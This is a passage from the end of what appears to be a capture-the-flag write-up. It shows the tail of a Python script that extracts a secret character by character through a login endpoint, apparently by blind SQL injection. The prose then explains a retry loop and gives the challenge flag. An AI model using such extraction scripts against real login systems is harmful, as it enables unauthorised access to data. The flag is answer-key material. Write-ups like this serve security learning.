                elif 'Invalid username/password' in resp.text:
                    correct = False
                else:
                    print('Unexpected result:')
                    print(resp.text)
                    import sys; sys.exit(1)
                break
            i += 1
        
        if correct:
            ans += c
            print(ans)
            j += 1
            break
    
    else:
        print('failed at:', j)
        break
</code><div class="named-fence-filename">s.py</div></pre>
<p>Notice the second <code>while True</code> loop in sending the request. This was because results from the lambda function were very inconsistent, and invoking the lambda function twice would give different results, so I had to keep trying until the correct sql query was returned. This was why I also added a lot of print statements throughout, so I would not lose progress in event of an error.</p>
<p>Eventually however, I get the flag: <code>TISC{a1PhAb3t_0N1Y}</code></p>
</div><div class="fixed w-[17.5rem] h-full top-0 right-0 pointer-events-none pr-8 max-lg:hidden"><!----></div></div></div></div>
    
  

</body></html>